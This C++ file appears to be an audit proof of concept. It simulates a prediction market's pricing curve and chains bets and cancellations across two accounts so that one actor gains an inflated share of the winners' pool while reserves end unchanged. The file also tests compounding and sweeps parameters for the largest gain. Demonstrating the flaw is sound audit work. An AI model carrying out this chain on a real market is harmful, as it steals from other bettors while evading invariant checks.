// t12_chain.cpp — turn t11's case C into a money path.
//
// pm_cancel_bet reverses the NOMINAL (amount, weight) pair. When another bet is open, the
// reversal leaves the curve cheaper on the cancelled side than it should be (t11: +10..+86%
// claim weight for the next stake). The reversal is also exactly commutative, so cancelling
// everything restores the reserves bit-for-bit — nothing trips an invariant afterwards.
//
// Chain (one actor, two accounts, one cancellation-enabled market, no LP ops, no leverage):
//   1. bet X on A          2. bet X on B          3. cancel (1)
//   4. bet X on A  <-- priced off the corrupted curve
//   5. cancel (2)          -> hold one A bet of X, weight inflated, everything else refunded
// Honest baseline: the same single X bet on A placed on the untouched market.
#include <cstdio>
#include <cstdint>
#include <vector>
typedef unsigned __int128 u128;
static u128 U(int64_t v) { return (u128)(uint64_t)v; }
static int64_t D(u128 v) { return (int64_t)(uint64_t)v; }

struct market { int64_t ra = 0, rb = 0, bets = 0, a_bets = 0, b_bets = 0, L = 0; u128 k = 0; };
struct bet    { int64_t amount = 0, weight = 0; int side = 0; };

static market make_market(int64_t liq) {
    market m; int64_t h = liq / 2;
    m.ra = h; m.rb = liq - h; m.L = liq; m.k = U(m.ra) * U(m.rb); return m;
}
static bet place(market& m, int side, int64_t amount) {
    int64_t rin = side == 0 ? m.ra : m.rb, rout = side == 0 ? m.rb : m.ra;
    int64_t nout = D(m.k / U(rin + amount));
    bet b; b.amount = amount; b.weight = rout - nout; b.side = side;
    if (side == 0) { m.ra += amount; m.rb = nout; m.a_bets += amount; }
    else           { m.rb += amount; m.ra = nout; m.b_bets += amount; }
    m.bets += amount; return b;
}
static bool cancel(market& m, const bet& b) {
    int64_t rin = b.side == 0 ? m.ra : m.rb;
    if (rin < b.amount) return false;                        // b06bdbf B6 guard
    if (b.side == 0) { m.ra -= b.amount; m.rb += b.weight; m.a_bets -= b.amount; }
    else             { m.rb -= b.amount; m.ra += b.weight; m.b_bets -= b.amount; }
    m.bets -= b.amount;
    m.k = U(m.ra) * U(m.rb);
    return true;
}

int main() {
    printf("=== the chain, 400000 market, X = 50000 ===\n");
    market m = make_market(400000);
    const int64_t X = 50000;
    market honest = make_market(400000);
    bet base = place(honest, 0, X);
    printf("  honest: one %lld bet on A buys weight %lld\n", (long long)X, (long long)base.weight);

    bet b1 = place(m, 0, X);
    printf("  1. bet A          ra=%-8lld rb=%-8lld weight=%lld\n",
           (long long)m.ra, (long long)m.rb, (long long)b1.weight);
    bet b2 = place(m, 1, X);
    printf("  2. bet B          ra=%-8lld rb=%-8lld weight=%lld\n",
           (long long)m.ra, (long long)m.rb, (long long)b2.weight);
    printf("  3. cancel (1)     %s", cancel(m, b1) ? "ok" : "REFUSED");
    printf("  ra=%-8lld rb=%-8lld\n", (long long)m.ra, (long long)m.rb);
    bet b3 = place(m, 0, X);
    printf("  4. bet A again    ra=%-8lld rb=%-8lld weight=%lld   <-- %+.2f%% vs honest\n",
           (long long)m.ra, (long long)m.rb, (long long)b3.weight,
           100.0 * (b3.weight - base.weight) / (double)base.weight);
    printf("  5. cancel (2)     %s", cancel(m, b2) ? "ok" : "REFUSED");
    printf("  ra=%-8lld rb=%-8lld k=%llu\n", (long long)m.ra, (long long)m.rb, (unsigned long long)m.k);
    printf("  final state vs honest-single-bet state: ra %lld/%lld  rb %lld/%lld  a_bets %lld/%lld  %s\n",
           (long long)m.ra, (long long)honest.ra, (long long)m.rb, (long long)honest.rb,
           (long long)m.a_bets, (long long)honest.a_bets,
           (m.ra == honest.ra && m.rb == honest.rb && m.a_bets == honest.a_bets)
             ? "IDENTICAL state, larger claim" : "state differs");
    printf("  actor holds: stake %lld, weight %lld (honest %lld) -> +%.2f%% of the winners' pool per VIZ\n",
           (long long)b3.amount, (long long)b3.weight, (long long)base.weight,
           100.0 * (b3.weight - base.weight) / (double)base.weight);

    printf("\n=== does it compound? repeat the (1,2,cancel1,bet,cancel2) block, keeping each A bet ===\n");
    {
        market c = make_market(400000);
        int64_t total_stake = 0, total_weight = 0;
        std::vector<bet> held;
        for (int i = 1; i <= 8; ++i) {
            bet p1 = place(c, 0, X);
            bet p2 = place(c, 1, X);
            if (!cancel(c, p1)) { printf("  round %d: cancel(1) refused\n", i); break; }
            bet p3 = place(c, 0, X);
            if (!cancel(c, p2)) { printf("  round %d: cancel(2) refused (ra=%lld)\n", i, (long long)c.ra); break; }
            held.push_back(p3);
            total_stake += p3.amount; total_weight += p3.weight;
            // honest: the same cumulative stake bought in one go on a fresh market
            market h = make_market(400000);
            int64_t hw = place(h, 0, total_stake).weight;
            printf("  round %d: held %lld stake, weight %-8lld  honest same stake = %-8lld  %+.2f%%\n",
                   i, (long long)total_stake, (long long)total_weight, (long long)hw,
                   100.0 * (total_weight - hw) / (double)hw);
        }
    }

    printf("\n=== sweep: best single-round inflation over (liquidity, X) ===\n");
    {
        double best = 0; int64_t bl = 0, bx = 0; long long tot = 0, ok = 0;
        for (int64_t liq = 100000; liq <= 2000000; liq += 23000)
        for (int64_t x = 1000; x <= 900000; x += 7331) {
            market s = make_market(liq), h = make_market(liq);
            int64_t hw = place(h, 0, x).weight;
            if (hw <= 0) continue;
            ++tot;
            bet p1 = place(s, 0, x);
            bet p2 = place(s, 1, x);
            if (!cancel(s, p1)) continue;
            bet p3 = place(s, 0, x);
            if (!cancel(s, p2)) continue;
            ++ok;
            double gain = 100.0 * (p3.weight - hw) / (double)hw;
            if (gain > best) { best = gain; bl = liq; bx = x; }
        }
        printf("  %lld/%lld chains complete; best %+.2f%% at liquidity=%lld X=%lld\n",
               ok, tot, best, (long long)bl, (long long)bx);
    }
    return 0;
}
